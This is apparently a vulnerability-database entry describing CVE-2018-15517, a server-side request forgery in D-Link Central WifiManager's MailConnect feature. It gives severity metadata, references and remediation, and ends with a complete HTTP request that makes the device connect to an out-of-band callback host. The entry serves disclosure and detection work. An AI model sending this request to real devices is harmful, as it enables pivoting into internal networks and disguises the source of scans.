---
layout: post
cve_id: CVE-2018-15517
title: D-Link Central WifiManager - Server-Side Request Forgery
pcap: true
pcap_path: /pcaps/2018/CVE-2018-15517.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2018/CVE-2018-15517.yaml
snort2_rule: N/A
snort3_rule: N/A
author: gy741
severity: high
impact: 'Successful exploitation of this vulnerability could lead to unauthorized
  access to internal resources, data leakage, and potential compromise of the entire
  network.

  '
remediation: 'Apply the latest security patches or updates provided by D-Link to fix
  the SSRF vulnerability in Central WifiManager.

  '
reference:
- http://hyp3rlinx.altervista.org/advisories/DLINK-CENTRAL-WIFI-MANAGER-CWM-100-SERVER-SIDE-REQUEST-FORGERY.txt
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15517
- http://seclists.org/fulldisclosure/2018/Nov/28
- http://packetstormsecurity.com/files/150243/D-LINK-Central-WifiManager-CWM-100-1.03-r0098-Server-Side-Request-Forgery.html
- https://github.com/ARPSyndicate/cvemon
classification:
  cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:H/A:N
  cvss-score: 8.6
  cve-id: CVE-2018-15517
  cwe-id: CWE-918
  epss-score: 0.76866
  epss-percentile: 0.98909
  cpe: cpe:2.3:a:dlink:central_wifimanager:1.03:r0098:*:*:*:*:*:*
metadata:
  max-request: 1
  vendor: dlink
  product: central_wifimanager
tags:
- cve
- cve2018
- seclists
- packetstorm
- dlink
- ssrf
- oast
- vkev
- vuln
---

## üîç Vulnerability Description
D-Link Central WifiManager is susceptible to server-side request forgery. The MailConnect feature on D-Link Central WiFiManager CWM-100 1.03 r0098 devices is intended to check a connection to an SMTP server but actually allows outbound TCP to any port on any IP address, as demonstrated by an index.php/System/MailConnect/host/127.0.0.1/port/22/secure/ URI. This can undermine accountability of where scan or connections actually came from and or bypass the FW etc. This can be automated via script or using a browser.

## üåê HTTP Request
```nohighlight
GET /index.php/System/MailConnect/host/d5j0aq1le0o1cm3ruqa0she81ws156rup.oast.pro/port/80/secure/ HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:1.9.5.20) Gecko/ Firefox/3.6.20
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

